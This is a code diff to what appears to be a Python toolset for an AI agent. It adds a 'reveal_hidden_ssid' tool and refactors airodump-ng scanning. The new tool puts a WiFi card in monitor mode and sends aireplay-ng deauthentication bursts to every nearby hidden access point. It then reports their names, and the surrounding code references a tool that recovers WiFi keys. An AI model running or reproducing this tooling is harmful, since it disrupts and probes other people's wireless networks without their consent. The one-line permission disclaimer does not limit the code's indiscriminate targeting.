@@ -359,40 +359,23 @@ def _dbm(power: str) -> int:
         return -1000
 
 
-def _airodump_scan(mon_iface: str, scan_seconds: int = 15) -> list[dict]:
-    """Run airodump-ng and return structured AP rows: {ssid, bssid, channel, enc, power}."""
-    import tempfile
-    with tempfile.TemporaryDirectory() as tmpdir:
-        prefix = os.path.join(tmpdir, "scan")
-        proc = subprocess.Popen(
-            ["sudo", "airodump-ng", "-w", prefix, "--output-format", "csv", mon_iface],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-        )
-        try:
-            time.sleep(min(scan_seconds, 30))
-        finally:
-            proc.terminate()
-            try:
-                proc.wait(timeout=3)
-            except subprocess.TimeoutExpired:
-                proc.kill()
-        csv_file = prefix + "-01.csv"
-        if not Path(csv_file).exists():
-            return []
-        lines = Path(csv_file).read_text(errors="replace").splitlines()
-
+def _parse_airodump_csv(csv_file: Path) -> tuple[list[dict], dict[str, set[str]]]:
+    """Parse an airodump-ng CSV into (APs, probes). Probes maps BSSID → probed SSIDs."""
+    lines = csv_file.read_text(errors="replace").splitlines()
     networks: list[dict] = []
-    in_ap = False
+    probes: dict[str, set[str]] = {}
+    section = ""
     for line in lines:
         if line.startswith("BSSID"):
-            in_ap = True
+            section = "ap"
             continue
         if line.startswith("Station MAC"):
-            break
-        if not line.strip() or not in_ap:
+            section = "station"
+            continue
+        if not line.strip():
             continue
         parts = [p.strip() for p in line.split(",")]
-        if len(parts) >= 14:
+        if section == "ap" and len(parts) >= 14:
             bssid, ch, enc, power, essid = parts[0], parts[3], parts[5], parts[8], parts[13]
             networks.append({
                 "ssid": essid or "",
@@ -401,8 +384,48 @@ def _airodump_scan(mon_iface: str, scan_seconds: int = 15) -> list[dict]:
                 "enc": enc,
                 "power": _dbm(power),
             })
+        elif section == "station" and len(parts) >= 7:
+            bssid = parts[5]
+            probed = parts[6:]  # "Probed ESSIDs" may itself be a comma-separated list
+            if bssid:
+                probes.setdefault(bssid, set()).update(s.strip() for s in probed if s.strip())
     networks.sort(key=lambda n: -n["power"])
-    return networks
+    return networks, probes
+
+
+def _airodump_run(mon_iface: str, seconds: int,
+                  deauth_bssids: list[str] | None = None) -> tuple[list[dict], dict[str, set[str]]]:
+    """Run airodump-ng for `seconds`, optionally deauthing BSSIDs after a short settle.
+    Returns (APs, probes)."""
+    import tempfile
+    with tempfile.TemporaryDirectory() as tmpdir:
+        prefix = os.path.join(tmpdir, "scan")
+        proc = subprocess.Popen(
+            ["sudo", "airodump-ng", "-w", prefix, "--output-format", "csv", mon_iface],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        try:
+            if deauth_bssids:
+                time.sleep(5)
+                for bssid in deauth_bssids:
+                    _sudo("aireplay-ng", "-0", "5", "-a", bssid, mon_iface, timeout=20)
+            time.sleep(seconds)
+        finally:
+            proc.terminate()
+            try:
+                proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+        csv_file = prefix + "-01.csv"
+        if not Path(csv_file).exists():
+            return [], {}
+        return _parse_airodump_csv(Path(csv_file))
+
+
+def _airodump_scan(mon_iface: str, scan_seconds: int = 15) -> list[dict]:
+    """Run airodump-ng and return structured AP rows: {ssid, bssid, channel, enc, power}."""
+    aps, _ = _airodump_run(mon_iface, scan_seconds)
+    return aps
 
 
 def _find_target_ap(ssid: str, networks: list[dict]) -> dict | None:
@@ -548,3 +571,58 @@ def gain_wifi_access(ssid: str, interface: str = "") -> str:
         connect_result = connect_wifi(ssid, iface, recovered)
         return f"Recovered the key for '{ssid}' via {method}. {connect_result}"
     return failure or f"Could not obtain access to '{ssid}'."
+
+
+@tool(description="Reveal the SSID of every nearby hidden WiFi network (networks that don't broadcast their name). Puts the interface in monitor mode, deauths clients so they re-announce the SSID, and reports all revealed names. Use only on networks you own or have permission to test. Requires Admin + the Wireless Tools grant.")
+def reveal_hidden_ssid(interface: str = "") -> str:
+    if not _has_wireless_admin():
+        return (
+            "Permission denied. Set the Wireless Tools to Admin in Settings → Permissions "
+            "and run the grant command shown there, then retry."
+        )
+    missing = [b for b in ("airmon-ng", "airodump-ng", "aireplay-ng") if _bin_missing(b)]
+    if missing:
+        return f"Missing tools: {', '.join(missing)}. Run install_wireless_tools first."
+
+    iface = interface or _detect_wifi_interface()
+    if not iface:
+        return "No WiFi interface found. Specify one explicitly."
+
+    mon = _detect_monitor_interface()
+    if not mon:
+        r = _sudo("airmon-ng", "start", iface, timeout=15)
+        if r.returncode != 0:
+            return f"Could not start monitor mode on {iface}: {(r.stdout + r.stderr).strip()}"
+        mon = _detect_monitor_interface() or iface + "mon"
+
+    try:
+        # 1. Find APs that broadcast no SSID.
+        aps, _ = _airodump_run(mon, 15)
+        hidden = [ap for ap in aps if not ap["ssid"]]
+        if not hidden:
+            return "No hidden networks found — all nearby networks broadcast their SSID."
+
+        # 2. Deauth clients on each hidden AP so they re-announce the SSID on reconnect.
+        bssids = [ap["bssid"] for ap in hidden]
+        aps2, probes2 = _airodump_run(mon, 20, deauth_bssids=bssids)
+
+        # 3. Map every hidden BSSID to a revealed name.
+        lines = [f"Found {len(hidden)} hidden network(s):"]
+        for ap in hidden:
+            bssid = ap["bssid"]
+            name = ""
+            for ap2 in aps2:
+                if ap2["bssid"] == bssid and ap2["ssid"]:
+                    name = ap2["ssid"]
+                    break
+            if name:
+                lines.append(f"{bssid} → {name!r}")
+            else:
+                candidates = sorted(probes2.get(bssid, set()))
+                if candidates:
+                    lines.append(f"{bssid} → candidates: {', '.join(repr(c) for c in candidates)}")
+                else:
+                    lines.append(f"{bssid} → not revealed (no client reconnected to deauth)")
+        return "\n".join(lines)
+    finally:
+        _stop_monitor(mon)
